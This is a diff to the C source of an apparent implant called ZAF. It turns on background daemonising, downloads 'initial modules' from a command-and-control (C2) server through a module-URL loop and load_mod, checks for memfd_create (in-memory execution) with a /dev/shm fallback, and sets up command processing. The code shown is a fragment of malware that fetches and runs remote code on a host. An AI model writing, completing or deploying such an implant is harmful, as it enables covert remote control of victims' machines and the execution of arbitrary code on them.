@@ -19,26 +19,8 @@
 #define _GNU_SOURCE
 
 
-#include <stdio.h>
-#include <curl/curl.h>
-#include <fcntl.h>
-
-#include <stdlib.h>
-#include <string.h>
-#include <sys/mman.h>
-#include <sys/stat.h>
-#include <sys/syscall.h>
-#include <sys/utsname.h>
-#include <signal.h>
-#include <unistd.h>
-#include <errno.h>
 
 #include "zaf.h"
-
-
-
-
-
 
 
 
@@ -58,24 +40,20 @@ int main (int argc, char **argv) {
     }
 
 	log_info("=== ZAF ===\n"); // parameterize
-    //backgroundDaemonLeader();
+
+    backgroundDaemonLeader();
     doWork();
 
-    fclose (fp);
+    if (fp != NULL){
+        fclose (fp);
+    }
 	return 0;
 }
 
-void doWork(){
+void downloadAutoModules(void){
 
-    char urlbuf[255] = {'\0'}; // TODO: what should this be?
+    char urlbuf[255] = {0}; // TODO: what should this be?
     int  i;
-
-    if (checKernel() == 1){
-	    log_info("Worker: memfd_create() support seems to be available.");
-    }else{
-	    log_info("Worker: /dev/shm fallback. memfd_create() support is not available.");
-    }
-
     log_debug("Worker: Trying for C2 download initial modules (if any)...");
 
     for(i = 0; i < sizeof(modules)/sizeof(modules[0]); i++)
@@ -84,8 +62,22 @@ void doWork(){
         log_debug("Worker: Module URL = %s", urlbuf);
         load_mod(head, urlbuf);
     }
-    
-    setupCmdP();
+}
 
+void initSetup(void){
+
+    if ( setKernel() == 1){
+        log_info("Main: memfd_create() is available.");
+    }else{
+        log_info("Main: only /dev/shm support seems to be available.");
+    }
+
+    downloadAutoModules();
+}
+
+void doWork(void){
+
+    initSetup();
+    setupCmdP();
 }
 
